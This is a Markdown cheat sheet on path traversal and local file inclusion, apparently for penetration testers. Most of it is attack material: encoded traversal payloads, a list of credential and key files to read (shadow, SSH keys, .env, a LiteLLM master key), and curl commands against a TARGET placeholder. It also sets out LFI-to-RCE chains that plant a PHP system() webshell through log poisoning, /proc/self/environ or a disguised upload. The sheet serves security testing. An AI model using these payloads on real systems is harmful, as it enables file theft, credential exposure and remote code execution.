# Path Traversal / Local File Inclusion (LFI)

**CWE-22** | Medium/High | File disclosure, config leak, RCE chain

## Detection Payloads

```
# Basic traversal
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd      ← URL encoded
..%252f..%252f..%252fetc/passwd  ← double encoded
....//....//etc/passwd            ← nested sequences
..\/..\/etc\/passwd               ← mixed slashes

# Windows
..\..\..\windows\system32\drivers\etc\hosts
..%5c..%5c..%5cwindows%5cwin.ini

# Null byte (older PHP)
../../../etc/passwd%00.jpg
```

---

## Common Targets

```
# Unix
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ              ← environment variables (may contain secrets)
/proc/self/cmdline
/proc/net/tcp
~/.ssh/id_rsa
~/.bash_history
/var/log/apache2/access.log     ← log poisoning → LFI → RCE

# Web app configs
/app/config.py
/app/.env
/app/settings.py
config/database.yml
.env
web.config

# AI/ML specific
/app/litellm_config.yaml        ← LiteLLM master key
~/.ollama/config
/root/.config/jupyter/jupyter_server_config.py
```

---

## Browser vs Direct Request (Google Gruyere pattern)

Browsers optimize `../` out of URLs before sending — so test with curl/Burp:
```bash
curl "https://TARGET.com/123/../secret.txt"        ← direct, bypasses browser
curl "https://TARGET.com/path/%2e%2e/secret.txt"   ← encoded, bypasses browser normalization
```

---

## LFI → RCE Chain

### Log Poisoning
```bash
# 1. Inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://TARGET.com/

# 2. Include the log
http://TARGET.com/?file=../../../var/log/apache2/access.log&cmd=id
```

### Via /proc/self/environ
```
# If environment variables are logged and LFI exists:
# Inject into HTTP_USER_AGENT environment variable
GET /?file=../../../proc/self/environ HTTP/1.1
User-Agent: <?php system('id'); ?>
```

### Via File Upload + LFI
```
1. Upload webshell disguised as image
2. Use LFI to include uploaded file path
3. Shell executes
```

---

## Data Tampering via Path Traversal

```
# File upload with traversal in filename (Google Gruyere pattern):
filename = "../../../app/config.py"

# Creates/overwrites files outside upload directory
# Can overwrite: config files, templates, Python source
```

---

## Checklist

- [ ] Test every filename/path parameter (direct and indirect)
- [ ] Test URL-encoded and double-encoded variants
- [ ] Use curl/Burp — not browser (browser normalizes `../`)
- [ ] Check file upload filenames for traversal
- [ ] Check username fields that become directory names
- [ ] Look for static file serving without path canonicalization

---

## Writeup References

- LFI to RCE: https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-session-files/
- Path traversal in API: https://medium.com/bugbountywriteup/how-i-found-a-path-traversal-and-rce-vulnerability-99d2d5668c2
